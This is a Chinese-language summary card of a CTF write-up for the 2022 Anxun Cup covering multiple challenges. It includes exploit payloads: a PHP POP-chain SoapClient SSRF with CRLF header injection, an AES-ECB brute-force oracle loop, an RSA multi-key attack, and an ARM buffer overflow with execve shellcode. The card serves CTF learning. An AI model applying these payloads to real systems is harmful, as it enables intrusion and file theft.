---
title: "第五届安洵杯 WriteUp by Mini-Venom(招新)"
category: web
tags: ["安洵杯", "web", "Web-PHP反序列化", "POP链", "SoapClient", "SSRF"]
signals: ["安洵杯 2022", "Web-PHP反序列化", "POP链", "SoapClient", "SSRF", "SplFileObject", "Node原型链污染", "SHA256爆破", "AES-ECB", "ssrf", "Web", "PHP", "POP", "uwant"]
difficulty: hard
source: "https://www.ctfiot.com/81074.html"
tools: ["ARM", "C", "Radare2"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第五届安洵杯 WriteUp by Mini-Venom(招新)

> 赛事：安洵杯 2022 | 方向：web | 难度：hard | 工具：ARM、C、Radare2

## 一句话总结

安洵杯2022全方向多题:Web PHP反序列化(POP链A→B→C→A.uwant→call_user_func+SoapClient SSRF→SplFileObject读f1111llllllaagg)+Node原型链污染+SHA256爆破4字符+AES-ECB key=IDl8FuWPu01RHZt}+RSA三公钥egcd+Diffie-Hellman XOR+ARM QEMU无保护shellcode

## 攻击链

1. index.php: ini_set+d0g3改session.serialize_handler→POST pop反序列化触发A.__wakeup→__invoke(A.a==md5(A.a)=0e215962017)→C.__toString→C.c()→B.__destruct→A.uwant()→call_user_func([SoapClient, a]) SSRF→flag.php?a=SplFileObject&b=/f1111llllllaagg|ssrf.php: SoapClient location+Cookie+user_agent|Node原型链污染: JSON.parse+clone+merge→req.flag==flag触发(实际题目错误,flag在/infoflllllag)|SHA256爆破4字符prefix: head+tail=fuWhjDPmS79bNGOS,target=e9015208236cb20c50d1d04fe11c9cf55dd8365d9410194c283c5100e3bf82d8|AES-ECB密钥: IDl8FuWPu01RHZt} flag2|RSA三公钥: e1,e2,e3+c1,c2,c3+n, egcd组合attack|Diffie-Hellman: PoW2 XOR Whitfield__Diffi|PWN-ARM: qemu启动开启NX+PIE无保护,add r0,pc shellcode+/bin/sh

## 关键 payload

```
SoapClient(null,array(''location''=>''http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg'',''user_agent''=>"crypt0n\r\nCookie: PHPSESSID=flag2333\r\n",''uri''=>''http://127.0.0.1/''))|str_replace(''O:1:"A":2'', ''O:1:"A":3'', $ser_str)|head(4字符)爆破SHA256|for i in range(16): payload = "0"*8+"0"*(15-i)+flag2+char+"0"*(15-i) c=encrypt(payload) if c[32:64]==c[64:96]: flag2+=char|egcd(e1,e2)+egcd(e1,e3)+egcd(E0,E1)|payload = ''a''*0x28 + p32(elf.bss()+0x2c) + p32(0x10C00) shellcode add r0,pc #12 mov r1,#0 mov r2,#0 mov r7,#11 svc 0|D0g3{o7sIDl8FuWPu01RHZt}|D0g3{New_3ra_@f_PK_Crypt0graphy_1976}
```

## 经验教训

1) PHP反序列化POP链跨类调用:A.__invoke触发`a==md5(a)`(`0e215962017`符合0e正则MD5)+`a->uwant()`+`call_user_func([SoapClient, a])`触发SoapClient.__call SSRF; 2) SoapClient SSRF用location+user_agent注入Cookie:PHPSESSID; 3) Node clone+merge原型链污染:`if(req.flag == "flag")`触发,但本题flag在/infoflllllag; 4) AES-ECB字节翻转攻击:中间位c[32:64]==c[64:96]判断爆破; 5) RSA三公钥攻击(同一m加密):egcd(e1,e2)=E0, egcd(e1,e3)=E1, 双重egcd(E0,E1)恢复m; 6) ARM QEMU启动时NX+PIE无效,bss+0x2c控制跳转; 7) SHA256 head+tail爆破:4字符空间62^4=14.7M

## 标签

Web-PHP反序列化、POP链、SoapClient、SSRF、SplFileObject、Node原型链污染、SHA256爆破、AES-ECB、Crypto-RSA三公钥、Diffie-Hellman、Pwn-ARM-QEMU

## 参考来源

- https://www.ctfiot.com/81074.html
- 原文件：第五届安洵杯_WriteUp_by_Mini-Venom（招新）.full.md
